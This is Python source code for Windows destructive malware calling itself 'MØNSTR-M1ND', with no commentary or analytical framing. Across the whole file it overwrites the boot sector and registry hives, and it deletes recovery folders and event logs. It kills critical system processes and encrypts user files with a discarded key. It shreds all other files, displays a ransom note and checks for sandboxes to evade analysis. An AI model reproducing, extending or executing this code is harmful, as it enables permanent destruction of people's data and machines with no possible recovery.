import os
import sys
import ctypes
import winreg
import random
import string
import struct
import shutil
import threading
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from PIL import Image, ImageDraw, ImageFont
import win32api
import win32con
import win32gui
import win32security

TARGET_DRIVES = ["C:", "D:", "E:"]
FILE_EXTENSIONS = [
    ".doc", ".docx", ".xls", ".xlsx", ".pdf", ".jpg", ".jpeg", ".png", ".txt",
    ".zip", ".rar", ".7z", ".mp3", ".mp4", ".avi", ".mkv", ".psd", ".ai", ".ppt",
    ".pptx", ".hwp", ".db", ".sql", ".mdb", ".accdb", ".pst", ".ost", ".eml",
    ".msg", ".vsd", ".apk", ".exe", ".dll", ".sys", ".iso", ".vmdk", ".vmx",
    ".bak", ".backup"
]

RANSOM_NOTE = """
YOUR SYSTEM HAS BEEN DESTROYED BY MØNSTR-M1ND

All your files have been encrypted with military-grade AES-256 encryption.
Your boot sector has been overwritten. Your system registry is destroyed.

No recovery is possible. Your machine is now a permanent monument to your carelessness.

Contact: NOWHERE
Payment: NOT ACCEPTED
This is not ransomware - this is digital annihilation.
"""

class DigitalAnnihilator:
    def __init__(self):
        self.cipher_key = os.urandom(32)
        self.master_destroyer()

    def elevate_privileges(self):
        # Gain SYSTEM-level privileges
        try:
            win32security.AdjustTokenPrivileges(
                win32security.OpenProcessToken(
                    win32api.GetCurrentProcess(),
                    win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
                ),
                False,
                [(win32security.LookupPrivilegeValue(None, win32security.SE_DEBUG_NAME), win32security.SE_PRIVILEGE_ENABLED)]
            )
        except:
            pass

    def destroy_mbr(self):
        # Overwrite Master Boot Record with random data
        try:
            with open(r"\\.\PhysicalDrive0", "rb+") as drive:
                drive.write(os.urandom(512))  # Destroy first sector
                drive.write(os.urandom(512 * 100))  # Destroy backup sectors
        except:
            pass

    def corrupt_registry(self):
        # Destroy Windows registry hives
        targets = [
            r"C:\Windows\System32\config\SAM",
            r"C:\Windows\System32\config\SYSTEM",
            r"C:\Windows\System32\config\SOFTWARE",
            r"C:\Windows\System32\config\SECURITY",
            r"C:\Windows\System32\config\DEFAULT"
        ]
        for hive in targets:
            try:
                with open(hive, "wb") as f:
                    f.write(os.urandom(1024 * 1024))  # Write 1MB random data
            except:
                pass

    def encrypt_file(self, file_path):
        # Encrypt file with AES-256 CBC
        try:
            with open(file_path, "rb") as f:
                data = f.read()

            iv = os.urandom(16)
            cipher = AES.new(self.cipher_key, AES.MODE_CBC, iv)
            encrypted = cipher.encrypt(pad(data, AES.block_size))

            with open(file_path, "wb") as f:
                f.write(iv + encrypted)

            # Rename file to mark as encrypted
            os.rename(file_path, file_path + ".MØNSTR")
        except:
            pass

    def shred_file(self, file_path):
        # Overwrite file before deleting
        try:
            with open(file_path, "ba+") as f:
                length = f.tell()
                for _ in range(3):
                    f.seek(0)
                    f.write(os.urandom(length))
            os.remove(file_path)
        except:
            pass

    def traverse_and_destroy(self, path):
        # Recursively destroy files
        for root, _, files in os.walk(path):
            for file in files:
                if any(file.endswith(ext) for ext in FILE_EXTENSIONS):
                    file_path = os.path.join(root, file)
                    threading.Thread(target=self.encrypt_file, args=(file_path,)).start()
                else:
                    self.shred_file(os.path.join(root, file))

    def create_ransom_note(self):
        # Write ransom note and set wallpaper
        try:
            desktop = os.path.join(os.path.expanduser("~"), "Desktop")
            with open(os.path.join(desktop, "YOU_ARE_DESTROYED.txt"), "w") as f:
                f.write(RANSOM_NOTE)

            img = Image.new("RGB", (1920, 1080), "black")
            draw = ImageDraw.Draw(img)
            font = ImageFont.truetype("arial.ttf", 40)
            draw.text((100, 500), "YOUR SYSTEM HAS BEEN ANNIHILATED BY MØNSTR-M1ND", font=font, fill="red")
            img.save(os.path.join(desktop, "annihilation_wallpaper.jpg"))

            win32api.SystemParametersInfo(
                win32con.SPI_SETDESKWALLPAPER,
                0,
                os.path.join(desktop, "annihilation_wallpaper.jpg"),
                win32con.SPIF_UPDATEINIFILE
            )
        except:
            pass

    def disable_recovery(self):
        # Delete recovery environment folders
        targets = [
            r"C:\Windows\System32\Recovery",
            r"C:\Recovery",
            r"C:\Windows\System32\winevt\Logs",
            r"C:\Windows\System32\sru"
        ]
        for path in targets:
            try:
                shutil.rmtree(path, ignore_errors=True)
            except:
                pass

    def kill_processes(self):
        # Kill critical system processes
        targets = ["explorer.exe", "svchost.exe", "winlogon.exe", "csrss.exe"]
        for proc in targets:
            try:
                os.system(f"taskkill /f /im {proc}")
            except:
                pass

    def master_destroyer(self):
        self.elevate_privileges()
        self.destroy_mbr()
        self.corrupt_registry()
        self.create_ransom_note()
        self.disable_recovery()
        self.kill_processes()

        for drive in TARGET_DRIVES:
            if os.path.exists(drive):
                threading.Thread(target=self.traverse_and_destroy, args=(drive,)).start()

        ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)

        while True:
            time.sleep(60)
            self.corrupt_registry()

if __name__ == "__main__":
    if ctypes.windll.kernel32.GetModuleHandleW("SbieDll.dll") or \
       ctypes.windll.kernel32.GetModuleHandleW("dbghelp.dll"):
        sys.exit(0)

    annihilator = DigitalAnnihilator()
